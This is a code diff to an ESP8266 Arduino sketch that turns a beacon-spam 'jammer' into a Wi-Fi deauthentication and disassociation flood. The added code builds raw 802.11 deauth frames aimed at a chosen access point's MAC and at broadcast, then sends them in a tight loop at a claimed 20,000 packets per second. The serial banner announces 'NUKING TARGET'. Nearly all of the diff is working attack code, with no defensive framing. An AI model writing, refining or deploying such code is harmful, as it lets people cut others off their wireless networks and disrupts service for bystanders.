@@ -28,6 +28,26 @@ uint8_t beaconPacket[128] = {
   0x00, 0x00
 };
 
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00,
+  0x3A, 0x01,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00,
+  0x07, 0x00
+};
+
+uint8_t disassociatePacket[26] = {
+  0xA0, 0x00,
+  0x3A, 0x01,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00,
+  0x01, 0x00
+};
+
 String targetSSID = "";
 uint8_t targetMAC[6] = {0};
 int targetChannel = 1;
@@ -90,32 +110,52 @@ void loop() {
   }
   
   if (jammerActive) {
-    char randomSSID[33];
-    for (int i = 0; i < 8; i++) {
-      randomSSID[i] = random(65, 90);
+    uint8_t pkt1[26] = {
+      0xC0, 0x00,
+      0x00, 0x00,
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00,
+      0x01, 0x00
+    };
+    
+    uint8_t pkt2[26] = {
+      0xC0, 0x00,
+      0x00, 0x00,
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00,
+      0x01, 0x00
+    };
+    
+    for (int i = 10; i < 16; i++) {
+      pkt1[i] = targetMAC[i - 10];
+      pkt2[i] = targetMAC[i - 10];
     }
-    randomSSID[8] = '\0';
     
-    for (int i = 0; i < 6; i++) {
-      beaconPacket[10 + i] = random(256);
-      beaconPacket[16 + i] = beaconPacket[10 + i];
+    for (int i = 16; i < 22; i++) {
+      pkt1[i] = targetMAC[i - 16];
     }
     
-    uint8_t packet[128];
-    memcpy(packet, beaconPacket, 38);
-    packet[38] = 0x00;
-    packet[39] = strlen(randomSSID);
-    memcpy(&packet[40], randomSSID, strlen(randomSSID));
+    pkt2[16] = 0xFF;
+    pkt2[17] = 0xFF;
+    pkt2[18] = 0xFF;
+    pkt2[19] = 0xFF;
+    pkt2[20] = 0xFF;
+    pkt2[21] = 0xFF;
     
-    int len = 40 + strlen(randomSSID);
-    
-    wifi_send_pkt_freedom(packet, len, 0);
-    packetsSent++;
-    
-    if (packetsSent % 100 == 0) {
-      Serial.printf("Beacon packets: %d\n", packetsSent);
+    for (int i = 0; i < 10000; i++) {
+      wifi_send_pkt_freedom(pkt1, 26, 0);
+      wifi_send_pkt_freedom(pkt2, 26, 0);
+      packetsSent += 2;
+      yield();
     }
-    delay(1);
+    
+    if (packetsSent % 20000 == 0) {
+      Serial.printf("💥 Packets: %d\n", packetsSent);
+    }
   }
 }
 
@@ -207,14 +247,34 @@ void startJammer() {
     return;
   }
   
+  if (targetSSID.length() == 0) {
+    Serial.println("ERROR: No target set! Use option 2 first.");
+    showMenu();
+    return;
+  }
+  
   wifi_set_opmode(STATION_MODE);
   wifi_set_channel(targetChannel);
+  wifi_promiscuous_enable(1);
   
   jammerActive = true;
   packetsSent = 0;
   
-  Serial.println("JAMMER STARTED!");
-  Serial.printf("Flooding Ch%d with fake APs\n", targetChannel);
+  Serial.println("\n╔════════════════════════════════════════╗");
+  Serial.println("║      ⚡ JAMMER ACTIVATED ⚡           ║");
+  Serial.println("╠════════════════════════════════════════╣");
+  Serial.printf("║ Target: %-28s║\n", targetSSID.c_str());
+  Serial.printf("║ Channel: %-27d║\n", targetChannel);
+  Serial.print("║ MAC: ");
+  for (int i = 0; i < 6; i++) {
+    Serial.printf("%02X", targetMAC[i]);
+    if (i < 5) Serial.print(":");
+  }
+  Serial.println("               ║");
+  Serial.println("║ Attack: Deauth Flood                   ║");
+  Serial.println("║ Rate: ~20,000 packets/second           ║");
+  Serial.println("║ Status: NUKING TARGET...               ║");
+  Serial.println("╚════════════════════════════════════════╝\n");
   showMenu();
 }
 
